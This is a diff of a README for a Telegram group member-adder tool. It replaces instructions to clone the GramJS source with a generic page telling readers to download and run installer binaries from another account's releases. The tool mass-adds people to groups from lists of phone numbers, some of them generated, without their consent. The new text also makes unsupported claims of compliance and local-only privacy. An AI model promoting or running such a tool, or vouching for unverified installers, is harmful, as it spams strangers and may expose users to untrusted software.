@@ -1,184 +1,58 @@
-<p align="center">
-  <img src="https://media.giphy.com/media/3o7TKMt1VVNkHV2PaE/giphy.gif" width="120" />
-</p>
+# 🚀 Get-Telegram-Members - Invite Members to Your Telegram Groups Easily
 
-<h1 align="center">🚀 GramJS Telegram Member Adder Bot</h1>
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/bariqluthfi/Get-Telegram-Members/releases)
 
-<p align="center">
-  <b>A GramJS-based Telegram bot to invite users into groups using phone numbers</b><br>
-  Optimized for <b>Termux (Android)</b> & <b>Linux</b> using <b>Yarn</b>
-</p>
+## 📖 Overview
+The GramJS Telegram Member Adder Bot is a tool for inviting users into Telegram groups using their phone numbers. This application simplifies the process of adding members, making it easier to grow your community.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Node.js-v18+-green">
-  <img src="https://img.shields.io/badge/GramJS-Latest-blue">
-  <img src="https://img.shields.io/badge/Platform-Termux%20%7C%20Linux-orange">
-  <img src="https://img.shields.io/badge/Status-Stable-success">
-</p>
+## 🚀 Getting Started
+To use the Get-Telegram-Members tool, follow these straightforward steps. You will need a computer with internet access and a valid Telegram account.
 
----
+## 🔍 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Internet Connection:** Requires a stable internet connection
+- **Telegram Account:** You need a valid Telegram account to use this tool
 
-✨ Features
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/bariqluthfi/Get-Telegram-Members/releases) to download the latest version of the software.
+2. Choose the installation file that matches your operating system. 
+3. Click on the download link to start the download.
+4. Once the download is complete, locate the file and double-click to run the installer.
+5. Follow the on-screen instructions to complete the installation.
 
-- ✅ Add users to Telegram groups using phone numbers  
-- ✅ Automatic verification of numbers before adding  
-- ✅ Fixed 10s delay between adds  
-- ✅ Hard-coded daily limit of 100 members  
-- ✅ Waits 3 hours after limit before continuing  
-- ✅ Runs 24×7 without disconnecting session  
-- ✅ Simple CLI with only three commands  
+## 📦 Using the Application
+Once installed, open the Get-Telegram-Members application. 
 
----
+1. **Log in to Your Telegram Account:** Enter your phone number linked to your Telegram account. 
+2. **Import Contacts:** You can choose to import a list of phone numbers you wish to invite. The application allows you to paste the phone numbers directly.
+3. **Select the Group:** Choose the Telegram group where you want to add the members.
+4. **Invite Members:** Press the button to invite the selected members. The bot will send them an invitation to join your group.
 
-📥 Preparing Your Numbers List
+## ⚙️ Features
+- **User-Friendly Interface:** The application is designed for ease of use. Whether you are new to technology or a seasoned user, you will find it straightforward.
+- **Multi-Group Support:** You can invite members to multiple groups at once.
+- **Import Options:** Easily import phone numbers with a simple copy and paste.
+- **Telegram Compliance:** The application adheres to Telegram's guidelines to ensure a safe usage experience.
 
-To use the bot, you’ll need a file of Telegram phone numbers.
+## 🔒 Privacy and Security
+Your privacy is our priority. The application does not store any of your phone numbers or group information. All operations happen locally on your device. 
 
-**Create users.txt:**  
-[![Create users.txt](https://img.shields.io/badge/Create-users.txt-blue?style=for-the-badge)](https://globalphone.wasmer.app)
+## 📞 Support
+If you have questions or need help using the tool, please check the issues section on the [GitHub repository](https://github.com/bariqluthfi/Get-Telegram-Members/issues). 
 
-Save the file in the project root, with one number per line:
+## 🌐 Community
+Join our community of users and contributors to share tips, get help, or discuss features. Engage with us on Telegram groups or forums dedicated to the Get-Telegram-Members application.
 
-`
-+919876543210 +14155552671 +44791112345
-`
+## 📝 Contributing
+We welcome contributions from everyone. If you wish to contribute to the code, documentation, or report bugs, please visit the [Contributing Guidelines](https://github.com/bariqluthfi/Get-Telegram-Members/blob/main/CONTRIBUTING.md) in the repository.
 
-👉🏻 Don't Generate A Lot. it will take a long time.
+## 📅 Changelog
+For details on what’s new or changed in each version of the application, see the [Changelog](https://github.com/bariqluthfi/Get-Telegram-Members/blob/main/CHANGELOG.md) on the repository.
 
-⚠️ Only verified Telegram numbers will be kept after running `/verify`.
+## ⚙️ Help and Troubleshooting
+If you encounter any issues, refer to the FAQ section in the repository or search for similar issues. Many common problems are resolved there.
 
-💡 Verifying with `/verify` may take a long time.  
-Instead, try this faster option:
+## 📜 License
+This project is licensed under the MIT License. For more details, see the [LICENSE](https://github.com/bariqluthfi/Get-Telegram-Members/blob/main/LICENSE) file in the repository.
 
-**Verify Users:**  
-[![Use Our Bot to Verify Users](https://img.shields.io/badge/Verify-Bot-green?style=for-the-badge)](https://t.me/cflowwbot)
-
----
-
-🔑 Get Telegram API ID & API Hash
-
-You must generate your own API credentials from Telegram.
-
-**Open Telegram Developer Portal:**  
-[![Telegram Developers](https://img.shields.io/badge/Open-Telegram%20Developers-2CA5E0?style=for-the-badge&logo=telegram)](https://my.telegram.org)
-
-**Steps:**
-1. Open the link above  
-2. Log in with your Telegram phone number  
-3. Choose **API development tools**  
-4. Fill in:
-   - App title (any name)
-   - Short name (any)
-   - Platform: Desktop / Android
-5. Submit the form  
-6. Copy your **API ID** and **API Hash**
-
-These will be requested automatically on first run and saved to `config.json`.
-
----
-
-📦 Installation & Setup
-
-1️⃣ Install packages (Termux):
-```copy
-pkg update -y && pkg install git nodejs -y && npm install -g yarn
-```
-
-Clone Repository:
-
-
-```copy
-git clone https://github.com/amanmohdtp/Get-Telegram-Members.git &&
-cd Get-Telegram-Members
-```
-
-Install dependencies:
-
-```copy
-yarn install
-```
-
----
-
-🔧 Interactive Config
-
-On first run, the bot asks for:
-
-📱 Your Telegram number
-
-🔑 API ID
-
-🔑 API Hash
-
-🎯 Target group link
-
-
-Saved automatically to config.json.
-
-
----
-
-▶️ Run the Bot
-
-```copy
-yarn start
-```
-
----
-
-💻 Bot Commands (CLI)
-
-🔍 Verify numbers
-
-`
-/verify
-`
-
-Removes non-Telegram users from users.txt.
-
-➕ Add verified members
-
-`
-/add
-`
-
-Adds members with 10s delay.
-After 100 users, waits 3 hours automatically.
-
-📊 Check status
-
-`
-/status
-`
-
-Shows current time, verified count, and commands list.
-
-
----
-
-⚠️ Important Notes
-
-Only valid Telegram numbers are processed
-
-Users with strict privacy settings may be skipped
-
-Daily limit of 100 enforced automatically
-
-Session stays alive 24×7
-
-
----
-<p align="center">
-  <img src="https://media.giphy.com/media/26AHONQ79FdWZhAI0/giphy.gif" width="300" />
-</p>
----
-
-🛠 Development Info
-
-🟢 Node.js
-
-📦 GramJS
-
-🧶 Yarn
-
-💻 Linux | macOS | Windows | Android (Termux)
+Remember, for the latest version of the application, you can always go to the [Releases page](https://github.com/bariqluthfi/Get-Telegram-Members/releases).
